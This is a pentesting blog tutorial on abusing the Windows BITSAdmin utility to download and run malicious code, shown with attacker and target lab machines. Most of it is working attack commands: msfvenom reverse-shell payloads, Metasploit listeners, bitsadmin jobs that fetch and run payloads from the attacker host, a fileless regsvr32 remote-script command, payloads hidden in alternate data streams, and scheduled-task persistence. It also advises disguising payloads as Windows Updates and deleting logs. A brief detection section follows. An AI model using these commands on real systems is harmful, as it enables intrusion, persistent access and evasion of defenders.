<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Windows for Pentester: BITSAdmin</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-for-pentester-bitsadmin/" rel="bookmark"><time class="entry-date published" datetime="2020-01-04T08:22:40+00:00">January 4, 2020</time><time class="updated" datetime="2025-06-02T14:23:11+00:00">June 2, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we are going to describe the utility of the BITSAdmin tool and how vital it is in Windows Penetration Testing.</span></p>
<p class="ai-optimize-8"><span style="color: #000000;">BITSAdmin is a tool preinstalled on Windows OS that can be used to download malicious files. It is one of the Living Off Land (LOL) Binaries.</span></p>
<p class="ai-optimize-10"><span style="color: #000000;">The main objective of publishing the series of “Windows for Pentester” is to introduce the circumstances and any kind of hurdles that can be faced by any Pentester while solving CTF challenges or OSCP labs which are based on Windows Operating System. Here we do not criticize any kind of misconfiguration that a network or system administrator does for providing higher permissions on any programs/binaries/files &amp; etc.”</span></p>
<h3 class="ai-optimize-11"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-12"><span style="color: #000000;"><strong>Introduction</strong></span>
<ul>
<li class="ai-optimize-13"><span style="color: #000000;">What is BITSAdmin?</span></li>
</ul>
</li>
<li class="ai-optimize-14"><span style="color: #000000;"><strong>Configurations used in Practical</strong></span></li>
<li class="ai-optimize-15"><span style="color: #000000;"><strong>Working with BITSAdmin</strong></span>
<ul>
<li class="ai-optimize-16"><span style="color: #000000;">Downloading using /transfer Switch</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">Downloading using /addfile Switch</span></li>
<li class="ai-optimize-18"><span style="color: #000000;">Downloading using PowerShell Cmdlet</span></li>
<li class="ai-optimize-19"><span style="color: #000000;">Downloading using One-liner</span></li>
</ul>
</li>
<li class="ai-optimize-20"><span style="color: #000000;"><strong>Penetration Testing using BITSAdmin </strong></span>
<ul>
<li class="ai-optimize-21"><span style="color: #000000;">Compromising using Malicious Executable</span></li>
<li class="ai-optimize-22"><span style="color: #000000;">Compromising using File-Less Payload</span></li>
<li class="ai-optimize-23"><span style="color: #000000;">Compromising with Malicious Executable inside ADS</span></li>
</ul>
</li>
<li class="ai-optimize-24"><span style="color: #000000;"><strong>Persistence using BITSAdmin</strong></span></li>
<li class="ai-optimize-25"><span style="color: #000000;"><strong>Detection</strong></span>
<ul>
<li class="ai-optimize-26"><span style="color: #000000;">SC Query</span></li>
<li class="ai-optimize-27"><span style="color: #000000;">QMGR Database</span></li>
<li class="ai-optimize-28"><span style="color: #000000;">Verbose Switch</span></li>
<li class="ai-optimize-29"><span style="color: #000000;">Event Logs</span></li>
</ul>
</li>
<li class="ai-optimize-30"><span style="color: #000000;"><strong>Mitigation</strong></span></li>
<li class="ai-optimize-31"><span style="color: #000000;"><strong>Conclusion</strong></span></li>
</ul>
<h3 class="ai-optimize-32"><span style="color: #800000;">Introduction</span></h3>
<h4 class="ai-optimize-33"><span style="color: #000000;">What is BITSAdmin?</span></h4>
<p class="ai-optimize-34"><span style="color: #000000;">Background Intelligent Transfer Service Admin is a command-line tool that creates downloads or uploads jobs and monitors their progress. BITSAdmin was released with the Windows XP. At that time, it used the IBackgroundCopyJob as its interface. The release of Windows Server 2003 introduced the Upload option of the BITSAdmin. With the release of Windows Vista, we had some additional features like Custom HTTP headers, Certificate-based client authentication, IPv6 support. </span></p>
<p class="ai-optimize-34"><span style="color: #000000;">The subsequent year was the release of Windows Server 2008, which introduced the File Transfer Notification Method (which we use it to run an executable in Practical #5). Windows 7 introduced the Branch Cache Method for the BITS Transfer. When BITS downloads a file, it performs the actual download behind the svchost.exe service. Users utilize BITSAdmin to download files from or upload files to HTTP web servers and SMB file shares. It considers the cost of the transfer and the network usage to ensure that the user’s foreground work remains unaffected. BITS can handle network interruptions, pausing and automatically resuming transfers, even after a reboot.</span></p>
<h3 class="ai-optimize-35"><span style="color: #800000;">Configurations used in Practical</span></h3>
<p class="ai-optimize-36"><span style="color: #000000;"><strong>Attacker: </strong></span></p>
<ul>
<li class="ai-optimize-37"><span style="color: #000000;"><strong>OS:</strong> Kali Linux 2019.4</span></li>
<li class="ai-optimize-38"><span style="color: #000000;"><strong>IP:</strong> 192.168.1.13</span></li>
</ul>
<p class="ai-optimize-39"><span style="color: #000000;"><strong>Target: </strong></span></p>
<ul>
<li class="ai-optimize-40"><span style="color: #000000;"><strong>OS:</strong> Windows 10 (Build 18363)</span></li>
<li class="ai-optimize-41"><span style="color: #000000;"><strong>IP:</strong> 192.168.1.11</span></li>
</ul>
<h3 class="ai-optimize-42"><span style="color: #800000;">Working with BITSAdmin</span></h3>
<p class="ai-optimize-43"><span style="color: #000000;">As we discussed in the introduction that BITSAdmin is used as a download client. Now we will see the BITSAdmin in action. There are 2 switches to download a file in BITSAdmin, first one is ‘/transfer’ and ‘/addfile’. The working of both these parameters is quite identical. But the way these switches present the progress and completion feedback is different. BITSAdmin downloads files in the form of jobs. A job has to be defined before moving forward. After downloading, we can work on the jobs using the various switches.</span></p>
<h3 class="ai-optimize-44"><span style="color: #800000;">Practical #1: Downloading using /transfer Switch</span></h3>
<p class="ai-optimize-45"><span style="color: #000000;">The /transfer switch is a short and quick way to download any file from the remote server to the Host Machine. To begin the transfer, we need to define the Display Name of the transfer. It can be anything the user wishes.</span></p>
<p class="ai-optimize-46"><span style="color: #000000;">Here, we named all our transfers as “hackingarticles”. Now after defining the name, we need to enter the location with the name of the file from the remote server. For the Test Environment, we have a sample image file named ignite.png at the remote server. We mention it and we also mention the Local Location and Name of the file. After providing all this information we hit Enter key and the transfer begins.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /transfer hackingarticles http://192.168.1.13/ignite.png c:\ignite.png</pre>
<p class="ai-optimize-47"><span style="color: #000000;">We can see that we can see the State as Transferred and we also get a confirmation “Transfer complete”. We perform a directory listing to check the file and assure ourselves that we successfully transferred the file.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-mJssKMAxJDw/XhBCg9v311I/AAAAAAAAiHE/abKzVTEVx4wBp6ti-_9-jQpN0RLgfbbYACLcBGAsYHQ/s1600/1.png"/></p>
<h3 class="ai-optimize-48"><span style="color: #800000;">Practical #2: Copying Files Locally </span></h3>
<p class="ai-optimize-49"><span style="color: #000000;">BITSAdmin works on the principle of File Transfer. Hence, we can also use it as a glorified copy and paste command. This means that BITSAdmin will also be able to transfer from one location to another on the same machine. Let’s give it a try.</span></p>
<p class="ai-optimize-50"><span style="color: #000000;">As we already know that the BITSAdmin deals with jobs. So, we will first declare a job. We named it hackingarticles.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /create hackingarticles</pre>
<p class="ai-optimize-51"><span style="color: #000000;">The file that is supposed to be transferred should be added to the job. We use the /addfile switch to complete this task. We will be transferring the file.txt from “C:\” to “C:\Users\Victim\Desktop\”.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /addfile hackingarticles c:\file.txt C:\Users\Victim\Desktop\file.txt</pre>
<p class="ai-optimize-52"><span style="color: #000000;">Now to initiate the transfer we will be using the /resume switch. This will sound different but the /resume switch does, in fact, initiate the transfer.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /resume hackingarticles</pre>
<p class="ai-optimize-53"><span style="color: #000000;">Now, when the transfer initiated. It transfers the file in the form of a temporary file. To actually get the file fully we will need to run the /complete switch. And as we can see that file is successfully transferred to the Destination.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /complete hackingarticles</pre>
<p class="ai-optimize-54"><span style="color: #000000;">We can see that the intended file is successfully downloaded on the Target System.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-ChildItem -Path C:\Users\Victim\Desktop</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-YfdyE5r0LkE/XhBCknbKjtI/AAAAAAAAiHw/KMB2Mkw_SqUqp4XESbgmBFw-boYylDY_wCLcBGAsYHQ/s1600/2.png"/></p>
<h3 class="ai-optimize-55"><span style="color: #800000;">Practical #3: Downloading using PowerShell Cmdlet</span></h3>
<p class="ai-optimize-56"><span style="color: #000000;">The practicals that we showed just now can be performed on Windows Command Prompt (cmd.exe) as well. With the release of the Windows Server 2016, Microsoft has released a cmdlet specifically for the PowerShell to manage the BITS Jobs using BITSAdmin Client. It is named as Start-BITSTransfer.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Start-BitsTransfer -Source http://192.168.1.13/ignite.png -Destination C:\ignite.png</pre>
<p class="ai-optimize-57"><span style="color: #000000;">For the transfer using this cmdlet, we don’t have to mention the name of the Job. We can just define the Source and Destination as shown in the image given below.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/--hokYviVFkA/XhBCl6ypPfI/AAAAAAAAiH8/JLOY9W7tJogt2IHeMyAl-FSImRt6WsxcgCLcBGAsYHQ/s1600/3.png"/></p>
<p class="ai-optimize-58"><span style="color: #000000;">Note: If while penetration testing, we get an environment that is strictly PowerShell and we are not able to use the BITSAdmin normally, we can use this method.</span></p>
<h3 class="ai-optimize-59"><span style="color: #800000;">Practical #4: Downloading using One-liner</span></h3>
<p class="ai-optimize-60"><span style="color: #000000;">We can transfer our files using BITSAdmin in one execution. This is a good example when we are in a hurry for a transfer. Instead of declaring the job, add the file to the job, resuming the job and complete the job in different steps we can complete all the steps required to transfer in this one-liner. This method accomplishes the work in one go. You can also use this to push to a location where you can execute a single instance of a command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /create hackingarticles | bitsadmin /transfer hackingarticles http://192.168.1.13/ignite.png c:\ignite.png | bitsadmin /resume hackingarticles | bitsadmin /complete hackingarticles
ls</pre>
<h3><img decoding="async" src="https://1.bp.blogspot.com/-5LaEpnWxWFE/XhBCl-vTVjI/AAAAAAAAiIA/HVKqZj2OUw8I3d9FaWBRNCPwz37VtT0YQCLcBGAsYHQ/s1600/4.png"/></h3>
<h3 class="ai-optimize-61"><span style="color: #800000;">Penetration Testing using BITSAdmin</span></h3>
<p class="ai-optimize-62"><span style="color: #000000;">BITSAdmin can perform many more functions (like upload files, etc.) but we will be focusing on Penetration Testing for now.</span></p>
<h3 class="ai-optimize-63"><span style="color: #800000;">Practical #5: Compromising using Malicious Executable</span></h3>
<p class="ai-optimize-64"><span style="color: #000000;">It’s time to move on from utility to Penetration Testing. We will obtain a meterpreter session using a payload that we will download and execute using the BITSAdmin. We tested these practicals in a lab-controlled environment where we maintained the same network configuration for the entirety of the Practical. So, we created the payload once and used it multiple times.</span></p>
<h5 class="ai-optimize-131"><strong><span style="color: #000000;">Creating and Hosting the Payload</span></strong></h5>
<p class="ai-optimize-65"><span style="color: #000000;">First, we choose to use the msfvenom tool to construct a payload in order to start the exploitation. Next, we employ the reverse_tcp payload, obtaining Meterpreter and aiming for the Windows system. Then, we specified the Lhost for the attacker machine’s IP address, followed by the Lport on which the victim machine will provide us the session. Finally, we delivered this payload to the /var/www/html/ directory after creating it as an executable.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.13 lport=1234 -f exe &gt; /var/www/html/payload.exe</pre>
<p class="ai-optimize-66"><span style="color: #000000;">After the payload creation, we start the Apache2 service so that the payload is available to download on the Local Network.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">service apache2 restart</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-0oLXjwJpoAM/XhBCmAnPSHI/AAAAAAAAiIE/9tmYSbdxcroL0El5cUqu5u3L4u1urzOgACLcBGAsYHQ/s1600/5.png"/></p>
<h5 class="ai-optimize-132"><strong><span style="color: #000000;">Setting Up the Listener and BITSAdmin Job</span></strong></h5>
<p class="ai-optimize-67"><span style="color: #000000;">After we serve the payload on the web server, we will run the listener, which will capture the meterpreter session when it generates.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.13
set lport 1234
run</pre>
<p class="ai-optimize-68"><span style="color: #000000;">We set the proper configuration of the payload. We set the attacker machine’s IP address as the localhost address and the port that we mentioned while creating the payload as a local port.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-1y6QiSk2THc/XhBCmmPc2LI/AAAAAAAAiII/cd3Uceqq_Zk-QuJn5PllLyFd89XONoKfwCLcBGAsYHQ/s1600/6.png"/></p>
<p class="ai-optimize-69"><span style="color: #000000;">In our previous practices, we downloaded a file, now we will download the payload using the same technique. But as BITSAdmin can also execute the payload by itself, we will define parameters for it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /create hackingarticles</pre>
<p class="ai-optimize-70"><span style="color: #000000;">Starting with creating a job named “hackingarticles”, then we add the payload file in the job that we just created.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /addfile hackingarticles http://192.168.1.13/payload.exe C:\payload.exe</pre>
<p class="ai-optimize-71"><span style="color: #000000;">After adding the file, we use the /SetNotifyCmdLine switch to execute the payload. This is done with the help of an action that we scripted. First, it will start the cmd.exe and then, it will complete the download and then it will execute the said command in the background.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /SetNotifyCmdLine hackingarticles cmd.exe "/c bitsadmin.exe /complete hackingarticles | start /B C:\payload.exe"</pre>
<p class="ai-optimize-72"><span style="color: #000000;">After this, we run the /resume switch to get the download started.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /resume hackingarticles</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-DZ9YS-rU_eM/XhBCm8MxmfI/AAAAAAAAiIM/GyTZ3KcBZ7kSd5dcF5FzuoaRm5q2Bii9wCLcBGAsYHQ/s1600/7.png"/></p>
<p class="ai-optimize-73"><span style="color: #000000;">After the download completes, it executes the payload and we have ourselves a meterpreter session.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sysinfo</pre>
<h3><img decoding="async" src="https://1.bp.blogspot.com/-ZYpU5n9OUks/XhBCnHXYclI/AAAAAAAAiIQ/oYoj1_pXI30yfMJwe5SIDloDSdtgKAedgCLcBGAsYHQ/s1600/8.png"/></h3>
<h3 class="ai-optimize-74"><span style="color: #800000;">Practical #6: Compromising using File-Less Payload</span></h3>
<p class="ai-optimize-75"><span style="color: #000000;">In the previous practical, we created a payload file and then gained a session from it. This method creates a file that can be detected. In other words, it was traceable. But as BITSAdmin can execute a command directly we can exploit the target without using a file.</span></p>
<p class="ai-optimize-76"><span style="color: #000000;">We will start this practice with our attacker machine, we will be running Metasploit Framework. After opening it, we will use the web_delivery Exploit as shown in the image given below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/script/web_delivery
set payload windows/x64/meterpreter/reverse_tcp</pre>
<p class="ai-optimize-77"><span style="color: #000000;">Here we choose the target 3 (Regsvr32) to generate a small command that we can execute to get the meterpreter session.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set target 3</pre>
<p class="ai-optimize-78"><span style="color: #000000;">We set the attacker machine’s IP Address as localhost address and we run it. It works for a bit and gives us the regsvr32 command that will give us access to the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">set lhost 192.168.1.13
run</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-EfazE1NLRi0/XhBCno9fC6I/AAAAAAAAiIU/EO0Sn7iXXV0bSVoT_rR8-iPWg2pv6tJMACLcBGAsYHQ/s1600/9.png"/></p>
<p class="ai-optimize-79"><span style="color: #000000;">On the Target Machine, there is a holdup. BITAdmin’s programming runs the command only after the download completes. So, we will need to download something. It can be anything that seems harmful. Since BITSAdmin is designed to download the Windows Updates, we can also use its file. Here we will be using a harmless PNG image file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /create hackingarticles
bitsadmin /transfer hackingarticles http://192.168.1.13/ignite.png c:\ignite.png</pre>
<p class="ai-optimize-80"><span style="color: #000000;">After adding the file, we will move on the /SetNotifyCmdLine. Here we will modify the command that web_delivery created in such a way that regsvr32.exe creates the session from the target machine to the attacker machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /SetNotifyCmdLine hackingarticles regsvr32.exe "/s /n /u /i:http://192.168.1.13:8080/dE8vICrV.sct scrobj.dll"</pre>
<p class="ai-optimize-81"><span style="color: #000000;">Finally, we resume the BITSAdmin to get this working.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /resume hackingarticles</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-lZgGI1mqfiI/XhBCg1DhExI/AAAAAAAAiHM/Ckjcpqc0gnM2P_u46S_GOJTqKdx11iFlACLcBGAsYHQ/s1600/10.png"/></p>
<p class="ai-optimize-82"><span style="color: #000000;">As shown in the screenshot given below, we grab a Meterpreter session from the Target Machine as soon as we execute the command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions 1
sysinfo</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-JbwW6aJuS0Q/XhBCgxuCRII/AAAAAAAAiHI/QiV0KIf5ctsjqL9ZpyVyKuZlaEje0TKtACLcBGAsYHQ/s1600/11.png"/></p>
<p class="ai-optimize-83"><span style="color: #000000;">This was a stealthy method as there is no file associated with the session we obtained. But this can get stealthier using the right techniques.</span></p>
<h3 class="ai-optimize-84"><span style="color: #800000;">Practical #7: Compromising with Malicious Executable inside ADS</span></h3>
<p class="ai-optimize-85"><span style="color: #000000;">In the <a style="color: #000000;" href="https://www.hackingarticles.in/windows-for-pentester-certutil/">previous article</a> of this series, we introduced Alternative Data Stream. So, without going into details about the Alternative Data Stream, let’s compromise the target machine with a payload concealed in the Alternative Data Steam.</span></p>
<p class="ai-optimize-86"><span style="color: #000000;">We will create a malicious executable payload using msfvenom as we did in Practical #5, as it is the same method, we are not showing it again here.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.13 lport=1234 -f exe &gt; /var/www/html/payload.exe
service apache2 restart</pre>
<p class="ai-optimize-87"><span style="color: #000000;">After creating the payload and starting the listener, we will move to our target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.13
set lport 1234
run</pre>
<p class="ai-optimize-88"><span style="color: #000000;">Here, we created a BITS job named hackingarticles using the /create switch.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /create hackingarticles</pre>
<p class="ai-optimize-89"><span style="color: #000000;">After creating the job, we will add the file to download using BITSAdmin’s /addfile switch.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /addfile hackingarticles http://192.168.1.13/payload.exe C:\payload.exe</pre>
<p class="ai-optimize-90"><span style="color: #000000;">After adding the payload successfully, we use the next switch /SetNotifyCmdLine to read the contents of the payload which will be downloaded and transfer to the alternative data stream of a file.txt.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /SetNotifyCmdLine hackingarticles cmd.exe "/c type C:\paylaod.exe &gt; C:\file.txt:payload.exe"</pre>
<p class="ai-optimize-91"><span style="color: #000000;">Keeping this configuration, we start the download using the /resume switch.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /resume hackingarticles</pre>
<p class="ai-optimize-92"><span style="color: #000000;">Here, we list the C:\file.txt contents to find that out payload.exe has successfully being transferred into the ADS of this file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Get-item -Path C:\file -stream *</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-ZkZTEnbEN-Q/XhBCiN87nqI/AAAAAAAAiHQ/TJxmHvAI4fs5Iw0-zExFw98MRWMxHll3wCLcBGAsYHQ/s1600/12.png"/></p>
<p class="ai-optimize-93"><span style="color: #000000;">Then, to execute the file that we placed in the ADS, we will use wmic. We will use the create switch followed by the path of the payload as shown in the image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wmic process call create "c:\file.txt:payload.exe"</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-rdPiWUEGJP0/XhBCiP4hwaI/AAAAAAAAiHU/aL_93kymtug0eI5rhJAbYcJCVKo8piQ3gCLcBGAsYHQ/s1600/13.png"/></p>
<p class="ai-optimize-94"><span style="color: #000000;">It says that the Execution was successful.</span></p>
<p class="ai-optimize-95"><span style="color: #000000;">We went back to our Attacker Machine to see that our listener had generated and captured a meterpreter instance. We run sysinfo to see the details of the Target System.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sysinfo</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-jjcIkSwitbs/XhBCiUJPzwI/AAAAAAAAiHY/Q5Q03h3A_Zo1WsuFnlhKxh6zvdy1qwRSgCLcBGAsYHQ/s1600/14.png"/></p>
<h3 class="ai-optimize-96"><span style="color: #800000;">Practical #8: Persistence using BITSAdmin</span></h3>
<p class="ai-optimize-97"><span style="color: #000000;">Persistence means that the exploited session will be available to you even after the target machine restarts. Let’s see how to achieve this using BITSAdmin.</span></p>
<h5 class="ai-optimize-133"><strong><span style="color: #000000;">Generating and Serving the Payload</span></strong></h5>
<p class="ai-optimize-98"><span style="color: #000000;">We will create a malicious executable payload using msfvenom as we did in Practical #5, as it is the same method, we are not showing it again here.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.13 lport=1234 -f exe &gt; /var/www/html/payload.exe
service apache2 restart</pre>
<p class="ai-optimize-99"><span style="color: #000000;">After creating the payload and starting the listener, we will move to our target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.13
set lport 1234
run</pre>
<h5 class="ai-optimize-134"><strong><span style="color: #000000;">Setting Up BITS Job for Execution</span></strong></h5>
<p class="ai-optimize-100"><span style="color: #000000;">Here, we created a BITS job named hackingarticles using the /create switch.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /create hackingarticles</pre>
<p class="ai-optimize-101"><span style="color: #000000;">After creating the job, we will add the file to download using BITSAdmin’s /addfile switch.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /addfile hackingarticles http://192.168.1.13/payload.exe C:\payload.exe</pre>
<p class="ai-optimize-102"><span style="color: #000000;">After adding the payload successfully, we use the next switch /SetNotifyCmdLine to execute the payload. This is done with the help of an action that we scripted. First, it will start the cmd.exe, and then it will complete the download and then it will execute the said command in the background.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /SetNotifyCmdLine hackingarticles cmd.exe "/c bitsadmin.exe /complete hackingarticles | start /B C:\payload.exe"</pre>
<p class="ai-optimize-103"><span style="color: #000000;">After this, we use another switch /SetMinRetryDelay. The system sets the minimum length of time, in seconds, that BITS waits after facing a transient error before trying to transfer the file. Here, if a transient error, which is a temporary error, sticks the payload that we download. BITS runs continuously if an error of such kind occurs. So, if our download is completed but cannot execute properly due to a transient error. This switch will cause it to retry after 120 seconds.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bitsadmin /SetMinRetryDelay hackingarticles 120</pre>
<h5 class="ai-optimize-135"><strong><span style="color: #000000;">Creating Scheduled Task for Persistence</span></strong></h5>
<p class="ai-optimize-104"><span style="color: #000000;">That was simply setting up an exploit to gain a session. Now we need to work on it to be a persistence method.  But the BITS can get into an error state and keep the payload in a temporary state without completing the download, and in turn stopping the execution of the payload. To solve this issue, we will use schtasks to resume our job at a specific time again and again. This will allow the payload to persist irrespective of any kind of issue.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">schtasks /create /tn hackingarticles /tr "C:\system32\bitsadmin.exe /resume hackingarticles" /sc minute /mo 60</pre>
<p class="ai-optimize-105"><span style="color: #000000;">The /resume switch in the schtasks will restart the BITS job when if, it enters an error state. Using a schedule modifier task (/mo) to make the task get reactivated every (60, in this case) minute. The BITSAdmin redownloads the payload in case of an error and schtasks take care of the execution of the payload on an event of a reboot of the machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">schtasks /run /tn hackingarticles</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-JkM_bVmH994/XhBCi4shVPI/AAAAAAAAiHc/BgZY3SDRXhAI2jNxxX-HOD8-mSs61zs8QCLcBGAsYHQ/s1600/15.png"/></p>
<p class="ai-optimize-106"><span style="color: #000000;">We went back to our Attacker Machine to see that our listener generated and captured a meterpreter instance. We run sysinfo to see the details of the Target System. In case of failure, we will have to restart the listener with the same configuration and we will have the session again in no time.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sysinfo</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-vDu8fAYbeUU/XhBCjLqHP2I/AAAAAAAAiHg/B4-ii0rPT5wPe6sygbStIuT5OrhA6i-bQCLcBGAsYHQ/s1600/16.png"/></p>
<p class="ai-optimize-107"><span style="color: #000000;">Please, note this is a limited demo. In the real-life scenarios, we suggest that rename the payload file to look like a Windows Update and perform all these tasks in the ‘%Temp%’ directory for obvious reasons. We also recommend that we modify the schtasks to delete the task after a particular time with removing the presence by deleting the logs related to this intrusion.</span></p>
<h3 class="ai-optimize-108"><span style="color: #000000;"><span style="color: #800000;">Detection    </span>  </span></h3>
<p class="ai-optimize-109"><span style="color: #000000;">Before the official introduction of BITSAdmin in the Windows Defender Real-time Scan, it was quite difficult to detect BITS Transfers. Apart from scanning through logs, there wasn’t any other method. Monitoring the logs for the usage of the <a style="color: #000000;" href="https://attack.mitre.org/software/S0190">BITSAdmin</a> tool (especially the ‘Transfer’, ‘Create’, ‘AddFile’, ‘SetNotifyFlags’, ‘SetNotifyCmdLine’, ‘SetMinRetryDelay’, ‘SetCustomHeaders’, and ‘Resume’ switches). Actually, there is a way to gain the information about the transfers. It is through the QMGR Database.</span></p>
<h3 class="ai-optimize-110"><span style="color: #800000;">SC Query</span></h3>
<p class="ai-optimize-111"><span style="color: #000000;">An administrator deploys BITSAdmin as a service. Hence, they can check its status with the SC Query Utility.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc query bits</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-0LgUONtvrOA/XhBCjsnYokI/AAAAAAAAiHk/oHBMWd06lPczSLrgU3UrniuHyJx05wougCLcBGAsYHQ/s1600/17.png"/></p>
<p class="ai-optimize-112"><span style="color: #000000;">This will show if there is an instance of any BITS Transfer Running or not.</span></p>
<h3 class="ai-optimize-113"><span style="color: #800000;">QMGR Database</span></h3>
<p class="ai-optimize-114"><span style="color: #000000;">It is an abbreviated form of the Queue Manager Database. This is a record of all the BITS Jobs. This database record generates 2 types of files: a .dat file and a .db file. You can find this database file at this location.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">C:\ProgramData\Microsoft\Network\Downloader\</pre>
<p class="ai-optimize-115"><span style="color: #000000;">We traversed to the said location using the <strong>dir</strong> command to find ourselves a qmgr.db file. We tried opening the file, but it was hex-encoded.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-VcSHcqz5P-k/XhBCjygc3JI/AAAAAAAAiHo/ba9IvCHHMtwBgEJIzUDmiOxbdN1ThQSGwCLcBGAsYHQ/s1600/18.png"/></p>
<p class="ai-optimize-116"><span style="color: #000000;">So, we used a Hex-Editor Online tool. Here we scanned through the data and found that we have the IP Address of the file that someone downloaded with its path. We followed the complete path, and it provides us with the temporary file that someone downloaded before the /complete switch was used.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-sPGOd6jwvSA/XhBCkDS0FcI/AAAAAAAAiHs/3-aErBjfI6Qbit_4MJLyQY1toGvx9mc5ACLcBGAsYHQ/s1600/19.png"/></p>
